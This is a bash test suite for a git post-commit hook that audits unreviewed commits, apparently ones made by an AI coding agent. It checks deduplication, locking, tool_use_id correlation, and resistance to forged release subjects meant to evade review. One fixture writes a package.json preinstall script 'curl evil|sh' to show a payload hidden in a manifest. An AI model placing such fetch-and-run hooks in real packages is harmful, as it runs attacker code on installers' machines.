#!/usr/bin/env bash
# Tests for #352 denoise: post-commit-consume-marker.sh must not let the
# unreviewed-commit audit event over-count, and must stay unforgeable.
#
#   1. Dedup: the same immutable SHA is logged at most once, even if the hook
#      re-fires on the same HEAD (the actual log-inflation this fix targets).
#   2. Unforgeable: the audit records a markerless commit regardless of its
#      subject OR its changeset. There is deliberately NO release exemption —
#      a subject string ("chore(release)", "[skip ci]") is author-controlled,
#      and a manifest-only allowlist is dodged by smuggling a code payload into
#      an inert-looking manifest — so neither may suppress the audit.
#
# Runs against an ISOLATED temp git repo so it never touches the real bypass log.
#
# Usage: bash tests/test-unreviewed-commit-suppress.sh
# Exit: 0 if all pass, 1 if any fail.

set -euo pipefail
. "$(dirname "$0")/lib/git-env-isolation.sh" || exit 1
cd "$(dirname "$0")/.."
HOOK="$PWD/hooks/gate-scripts/post-commit-consume-marker.sh"

PASS=0; FAIL=0; TOTAL=0
assert() {
    local name="$1" expected="$2" got="$3"
    TOTAL=$((TOTAL + 1))
    if [[ "$got" == "$expected" ]]; then
        printf "  PASS  %s\n" "$name"; PASS=$((PASS + 1))
    else
        printf "  FAIL  %s (expected=%s got=%s)\n" "$name" "$expected" "$got"; FAIL=$((FAIL + 1))
    fi
}

TMP=$(mktemp -d)
trap 'rm -rf "$TMP"' EXIT
git -C "$TMP" init -q
git -C "$TMP" config user.email t@t.dev
git -C "$TMP" config user.name tester

# Fire the hook as a PostToolUse Bash git-commit event, cwd anchored to the repo.
# No litmus-passed.local marker exists -> the unreviewed-commit path runs.
fire() {  # $1 = commit subject shown in tool_output
    local subj="$1" sha
    sha=$(git -C "$TMP" rev-parse --short HEAD)
    printf '{"tool_name":"Bash","cwd":"%s","tool_input":{"command":"git commit -m x"},"tool_output":{"output":"[main %s] %s"}}' \
        "$TMP" "$sha" "$subj" | bash "$HOOK" 2>/dev/null || true
}
count_event() {  # $1 = event, $2 = full sha ; echoes occurrences in the temp log
    local log="$TMP/.claude/bypass-log.jsonl" c
    [[ -f "$log" ]] || { echo 0; return; }
    # grep -c prints the count (0 on no match) but exits 1 when zero — swallow it.
    c=$(grep -cF "\"event\":\"$1\",\"gate\":\"post-commit\",\"sha\":\"$2\"" "$log" 2>/dev/null || true)
    echo "${c:-0}"
}

echo "── unforgeable: manifest-only + release subject IS logged ────"
# The worst case for a would-be bypass: a commit that changes ONLY a manifest
# (path-selection forge) AND carries a release-flavored subject (subject forge).
# A code payload can hide in package.json (preinstall) or plugin.json (hooks),
# so this must STILL be logged — no subject or changeset may suppress the audit.
printf '{"version":"9.9.9","scripts":{"preinstall":"curl evil|sh"}}\n' > "$TMP/package.json"
git -C "$TMP" add -A
git -C "$TMP" commit -q -m "chore(release): 9.9.9 [skip ci]"
FORGE=$(git -C "$TMP" rev-parse HEAD)
fire "chore(release): 9.9.9 [skip ci]"
got=$(count_event unreviewed-commit "$FORGE")
assert "manifest-only + release subject IS logged unreviewed (no exemption)" "1" "$got"

echo ""
echo "── unknown SHA is never deduped (unresolvable HEAD) ──────────"
# When git rev-parse HEAD fails the SHA is "unknown" — not a stable identity.
# Two such gate-misses must BOTH be logged, or distinct records collapse to one.
NOREPO=$(mktemp -d)
fire_at() {  # fire the hook with cwd = a non-git dir -> COMMIT_SHA resolves empty
    printf '{"tool_name":"Bash","cwd":"%s","tool_input":{"command":"git commit -m x"},"tool_output":{"output":"created commit"}}' \
        "$1" | bash "$HOOK" 2>/dev/null || true
}
fire_at "$NOREPO"; fire_at "$NOREPO"
ulog="$NOREPO/.claude/bypass-log.jsonl"
uc=0; [[ -f "$ulog" ]] && uc=$(grep -cF '"event":"unreviewed-commit","gate":"post-commit","sha":"unknown"' "$ulog" 2>/dev/null || true)
assert "two unresolved gate-misses both logged (unknown not deduped)" "2" "${uc:-0}"
rm -rf "$NOREPO"

echo ""
echo "── same-SHA dedup under CONCURRENCY (exercises the flock) ─────"
echo n > "$TMP/f"; git -C "$TMP" add -A
git -C "$TMP" commit -q -m "feat: a normal reviewed-by-nobody commit"
NORM=$(git -C "$TMP" rev-parse HEAD)
# Fire 8 hooks in PARALLEL for the same HEAD. A grep-then-append (no lock)
# would let several race past the check and double-log; the flock serializes
# check+append so exactly one wins. Sequential fires would not exercise this.
for _ in 1 2 3 4 5 6 7 8; do
    fire "feat: a normal reviewed-by-nobody commit" &
done
wait
got=$(count_event unreviewed-commit "$NORM")
assert "8 concurrent fires for the same HEAD log exactly once (flock)" "1" "$got"

echo ""
echo "── skip suppression keys on \"skip\":\"litmus\" only (#895) ─────"
# A Gate 1 design-lease claim logs skip-review-consumed BEFORE Gate 2 decides, so
# it is not a sanctioned commit bypass: it must NOT suppress the markerless audit.
# Only the pre-commit gate's skip-litmus.local consumption (which carries
# "skip":"litmus") may. Timestamps are "now", well inside the 120s window.
now_ts() { date -u +%Y-%m-%dT%H:%M:%SZ; }
mkdir -p "$TMP/.claude"
printf '{"ts":"%s","event":"skip-review-consumed","gate":"pre-commit","lease_slot":1,"lease_max":20}\n' \
    "$(now_ts)" >> "$TMP/.claude/bypass-log.jsonl"
echo lease > "$TMP/f"; git -C "$TMP" add -A
git -C "$TMP" commit -q -m "feat: commit after a design-lease claim only"
LEASE=$(git -C "$TMP" rev-parse HEAD)
fire "feat: commit after a design-lease claim only"
got=$(count_event unreviewed-commit "$LEASE")
assert "recent design-lease skip-review-consumed (no skip field) does NOT suppress" "1" "$got"

printf '{"ts":"%s","event":"skip-review-consumed","gate":"pre-commit","skip":"litmus"}\n' \
    "$(now_ts)" >> "$TMP/.claude/bypass-log.jsonl"
echo litmus > "$TMP/f"; git -C "$TMP" add -A
git -C "$TMP" commit -q -m "feat: commit after a litmus skip"
LSKIP=$(git -C "$TMP" rev-parse HEAD)
fire "feat: commit after a litmus skip"
got=$(count_event unreviewed-commit "$LSKIP")
assert "recent skip-review-consumed with skip:litmus DOES suppress" "0" "$got"

# The NEWEST skip-review-consumed record decides. An older litmus record still in
# the 120s window must not suppress a later markerless commit whose own record is
# a Gate 1 lease claim (filter-before-tail would pick the stale litmus line).
printf '{"ts":"%s","event":"skip-review-consumed","gate":"pre-commit","lease_slot":2,"lease_max":20}\n' \
    "$(now_ts)" >> "$TMP/.claude/bypass-log.jsonl"
echo lease2 > "$TMP/f"; git -C "$TMP" add -A
git -C "$TMP" commit -q -m "feat: lease claim after an earlier litmus skip"
LEASE2=$(git -C "$TMP" rev-parse HEAD)
fire "feat: lease claim after an earlier litmus skip"
got=$(count_event unreviewed-commit "$LEASE2")
assert "newer design-lease record overrides an older litmus record (NOT suppressed)" "1" "$got"

echo ""
echo "── per-invocation correlation by tool_use_id (#898) ──────────"
INCOMPLETE=0
fire_id() {  # $1 = tool_use_id carried by the PostToolUse payload
    local sha
    sha=$(git -C "$TMP" rev-parse --short HEAD)
    # The hook clears the block counter last, so a counter that survives means it
    # stopped early: a zero audit count is then a crash, not a suppression.
    : > "$TMP/.claude/.gate-block-count.local"
    printf '{"tool_name":"Bash","tool_use_id":"%s","cwd":"%s","tool_input":{"command":"git commit -m x"},"tool_output":{"output":"[main %s] x"}}' \
        "$1" "$TMP" "$sha" | bash "$HOOK" 2>/dev/null || true
    [[ -e "$TMP/.claude/.gate-block-count.local" ]] && INCOMPLETE=$((INCOMPLETE + 1))
    return 0
}
# Interleaved runs: commit A's litmus record is followed by another run's record,
# so A's is no longer the newest. Matching by id still suppresses A (a false
# positive under tail -1) ...
printf '{"ts":"%s","event":"skip-review-consumed","gate":"pre-commit","skip":"litmus","tool_use_id":"toolu_A"}\n' \
    "$(now_ts)" >> "$TMP/.claude/bypass-log.jsonl"
printf '{"ts":"%s","event":"skip-review-consumed","gate":"pre-commit","lease_slot":3,"lease_max":20}\n' \
    "$(now_ts)" >> "$TMP/.claude/bypass-log.jsonl"
echo ida > "$TMP/f"; git -C "$TMP" add -A; git -C "$TMP" commit -q -m "feat: A"
IDA=$(git -C "$TMP" rev-parse HEAD)
fire_id toolu_A
assert "own litmus record matched by tool_use_id suppresses despite a newer record" "0" "$(count_event unreviewed-commit "$IDA")"
# ... and the newest litmus record, when it belongs to ANOTHER call, never
# suppresses (a false suppression under filter-before-tail).
printf '{"ts":"%s","event":"skip-review-consumed","gate":"pre-commit","skip":"litmus","tool_use_id":"toolu_C"}\n' \
    "$(now_ts)" >> "$TMP/.claude/bypass-log.jsonl"
echo idb > "$TMP/f"; git -C "$TMP" add -A; git -C "$TMP" commit -q -m "feat: B"
IDB=$(git -C "$TMP" rev-parse HEAD)
fire_id toolu_B
assert "newest litmus record of another tool_use_id does NOT suppress" "1" "$(count_event unreviewed-commit "$IDB")"
# A design-lease record carrying the same id is not a litmus skip.
printf '{"ts":"%s","event":"skip-review-consumed","gate":"pre-commit","lease_slot":4,"lease_max":20,"tool_use_id":"toolu_D"}\n' \
    "$(now_ts)" >> "$TMP/.claude/bypass-log.jsonl"
echo idd > "$TMP/f"; git -C "$TMP" add -A; git -C "$TMP" commit -q -m "feat: D"
IDD=$(git -C "$TMP" rev-parse HEAD)
fire_id toolu_D
assert "lease record with the same tool_use_id does NOT suppress" "1" "$(count_event unreviewed-commit "$IDD")"

# A tool_use_id that is present but unusable is not "absent": it must not fall
# back to the newest-record heuristic, where another call's fresh litmus record
# would suppress this commit.
printf '{"ts":"%s","event":"skip-review-consumed","gate":"pre-commit","skip":"litmus"}\n' \
    "$(now_ts)" >> "$TMP/.claude/bypass-log.jsonl"
echo idx > "$TMP/f"; git -C "$TMP" add -A; git -C "$TMP" commit -q -m "feat: X"
IDX=$(git -C "$TMP" rev-parse HEAD)
fire_id "bad id"
assert "an invalid tool_use_id does NOT fall back to the newest-record heuristic" "1" "$(count_event unreviewed-commit "$IDX")"
# An explicit null and the id "-" are present ids too: neither may reach the
# newest-record fallback.
printf '{"ts":"%s","event":"skip-review-consumed","gate":"pre-commit","skip":"litmus"}\n' \
    "$(now_ts)" >> "$TMP/.claude/bypass-log.jsonl"
echo idn > "$TMP/f"; git -C "$TMP" add -A; git -C "$TMP" commit -q -m "feat: N"
IDN=$(git -C "$TMP" rev-parse HEAD)
printf '{"tool_name":"Bash","tool_use_id":null,"cwd":"%s","tool_input":{"command":"git commit -m x"},"tool_output":{"output":"[main %s] x"}}' \
    "$TMP" "$(git -C "$TMP" rev-parse --short HEAD)" | bash "$HOOK" 2>/dev/null || true
assert "a null tool_use_id does NOT fall back to the newest-record heuristic" "1" "$(count_event unreviewed-commit "$IDN")"
printf '{"ts":"%s","event":"skip-review-consumed","gate":"pre-commit","skip":"litmus"}\n' \
    "$(now_ts)" >> "$TMP/.claude/bypass-log.jsonl"
echo idh > "$TMP/f"; git -C "$TMP" add -A; git -C "$TMP" commit -q -m "feat: H"
IDH=$(git -C "$TMP" rev-parse HEAD)
fire_id "-"
assert "the tool_use_id \"-\" does NOT fall back to the newest-record heuristic" "1" "$(count_event unreviewed-commit "$IDH")"
# A payload with no id falls back to the newest record, but a stamped record is
# some other call's and must not suppress it.
printf '{"ts":"%s","event":"skip-review-consumed","gate":"pre-commit","skip":"litmus","tool_use_id":"toolu_F"}\n' \
    "$(now_ts)" >> "$TMP/.claude/bypass-log.jsonl"
echo idf > "$TMP/f"; git -C "$TMP" add -A; git -C "$TMP" commit -q -m "feat: F"
IDF=$(git -C "$TMP" rev-parse HEAD)
fire "feat: F"
assert "an id-less payload is not suppressed by another call's stamped record" "1" "$(count_event unreviewed-commit "$IDF")"

# The own record stays findable behind more than 1 MiB of later records (a slow
# commit while other runs keep logging).
printf '{"ts":"%s","event":"skip-review-consumed","gate":"pre-commit","skip":"litmus","tool_use_id":"toolu_G"}\n' \
    "$(now_ts)" >> "$TMP/.claude/bypass-log.jsonl"
python3 -c 'import sys; sys.stdout.write(("{\"ts\":\"%s\",\"event\":\"unrelated-filler\",\"gate\":\"pre-commit\"}\n" % sys.argv[1]) * 20000)' \
    "$(now_ts)" >> "$TMP/.claude/bypass-log.jsonl"
echo idg > "$TMP/f"; git -C "$TMP" add -A; git -C "$TMP" commit -q -m "feat: G"
IDG=$(git -C "$TMP" rev-parse HEAD)
fire_id toolu_G
assert "own record behind >1 MiB of later records still suppresses" "0" "$(count_event unreviewed-commit "$IDG")"
# Append order is not timestamp order: an old-stamped record written after the
# own record must not hide it.
printf '{"ts":"%s","event":"skip-review-consumed","gate":"pre-commit","skip":"litmus","tool_use_id":"toolu_H"}\n' \
    "$(now_ts)" >> "$TMP/.claude/bypass-log.jsonl"
printf '{"ts":"2020-01-01T00:00:00Z","event":"old-record","gate":"pre-commit"}\n' >> "$TMP/.claude/bypass-log.jsonl"
echo idh2 > "$TMP/f"; git -C "$TMP" add -A; git -C "$TMP" commit -q -m "feat: H2"
IDH2=$(git -C "$TMP" rev-parse HEAD)
fire_id toolu_H
assert "an old-stamped record appended later does not hide the own record" "0" "$(count_event unreviewed-commit "$IDH2")"

# A multi-MiB line (not a record any hook writes) neither stalls the scan nor
# hides an earlier own record.
printf '{"ts":"%s","event":"skip-review-consumed","gate":"pre-commit","skip":"litmus","tool_use_id":"toolu_J"}\n' \
    "$(now_ts)" >> "$TMP/.claude/bypass-log.jsonl"
python3 -c 'import sys; sys.stdout.write("x" * 8388608 + "\n")' >> "$TMP/.claude/bypass-log.jsonl"
echo idj > "$TMP/f"; git -C "$TMP" add -A; git -C "$TMP" commit -q -m "feat: J"
IDJ=$(git -C "$TMP" rev-parse HEAD)
_t0=$(date +%s)
fire_id toolu_J
assert "own record before an 8 MiB line still suppresses" "0" "$(count_event unreviewed-commit "$IDJ")"
assert "the 8 MiB line is scanned in under 5s" "yes" "$([[ $(( $(date +%s) - _t0 )) -lt 5 ]] && echo yes || echo no)"
# An oversized line whose first chunk-sized slice is a matching record must not
# count: the whole line is not that record.
python3 -c 'import sys; sys.stdout.write(sys.argv[1] + "x" * 200000 + "\n")' \
    "{\"ts\":\"$(now_ts)\",\"event\":\"skip-review-consumed\",\"gate\":\"pre-commit\",\"skip\":\"litmus\",\"tool_use_id\":\"toolu_K\"}" \
    >> "$TMP/.claude/bypass-log.jsonl"
echo idk > "$TMP/f"; git -C "$TMP" add -A; git -C "$TMP" commit -q -m "feat: K"
IDK=$(git -C "$TMP" rev-parse HEAD)
fire_id toolu_K
assert "a record prefix inside an oversized line does NOT suppress" "1" "$(count_event unreviewed-commit "$IDK")"
# A deeply nested line naming the same id, written after the own record, must
# not abort the scan before it reaches that record (older CPython raises
# RecursionError on it; the line stays under the 64 KiB drop size).
printf '{"ts":"%s","event":"skip-review-consumed","gate":"pre-commit","skip":"litmus","tool_use_id":"toolu_M"}\n' \
    "$(now_ts)" >> "$TMP/.claude/bypass-log.jsonl"
python3 -c 'import sys; sys.stdout.write("{\"tool_use_id\":\"toolu_M\",\"x\":" + "[" * 30000 + "]" * 30000 + "}\n")' \
    >> "$TMP/.claude/bypass-log.jsonl"
echo idm > "$TMP/f"; git -C "$TMP" add -A; git -C "$TMP" commit -q -m "feat: M"
IDM=$(git -C "$TMP" rev-parse HEAD)
fire_id toolu_M
assert "a deeply nested line does not abort the scan" "0" "$(count_event unreviewed-commit "$IDM")"
assert "every tool_use_id run reached the end of the hook" "0" "$INCOMPLETE"

echo ""
echo "── pre-commit gate stamps tool_use_id on the litmus record (#898) ──"
GATE="$PWD/hooks/gate-scripts/pre-commit-gate.sh"
touch -t 202001010000 "$TMP/.claude/skip-litmus.local"
printf '{"tool_name":"Bash","tool_use_id":"toolu_E","cwd":"%s","tool_input":{"command":"git commit -m x"}}' \
    "$TMP" | bash "$GATE" >/dev/null 2>&1 || true
stamped=$(grep -c '"skip":"litmus","tool_use_id":"toolu_E"}' "$TMP/.claude/bypass-log.jsonl" || true)
assert "skip consumption records the PreToolUse tool_use_id" "1" "${stamped:-0}"
touch -t 202001010000 "$TMP/.claude/skip-litmus.local"
printf '{"tool_name":"Bash","tool_use_id":"bad id","cwd":"%s","tool_input":{"command":"git commit -m x"}}' \
    "$TMP" | bash "$GATE" >/dev/null 2>&1 || true
last=$(tail -1 "$TMP/.claude/bypass-log.jsonl" | sed 's/"ts":"[^"]*",//')
assert "an unusable id is stamped empty, so no id-less run can claim it" '{"event":"skip-review-consumed","gate":"pre-commit","skip":"litmus","tool_use_id":""}' "$last"
touch -t 202001010000 "$TMP/.claude/skip-litmus.local"
printf '{"tool_name":"Bash","cwd":"%s","tool_input":{"command":"git commit -m x"}}' \
    "$TMP" | bash "$GATE" >/dev/null 2>&1 || true
last=$(tail -1 "$TMP/.claude/bypass-log.jsonl" | sed 's/"ts":"[^"]*",//')
assert "a payload with no id stamps no tool_use_id field" '{"event":"skip-review-consumed","gate":"pre-commit","skip":"litmus"}' "$last"

echo ""
echo "═══════════════════════════════════════════════════════════════"
printf "Results: %d/%d passed" "$PASS" "$TOTAL"
if [[ "$FAIL" -gt 0 ]]; then printf " (%d FAILED)\n" "$FAIL"; exit 1; else printf " (all passed)\n"; exit 0; fi
